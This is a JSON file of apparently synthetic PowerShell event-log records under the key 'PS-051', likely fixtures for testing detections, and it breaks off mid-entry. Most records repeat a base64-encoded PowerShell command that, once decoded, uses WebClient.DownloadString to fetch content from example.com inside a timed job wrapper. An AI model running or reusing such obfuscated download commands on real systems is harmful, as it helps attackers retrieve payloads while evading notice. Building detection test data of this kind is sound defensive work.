{
  "PS-051": [
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "$global:?"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAnACkACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIA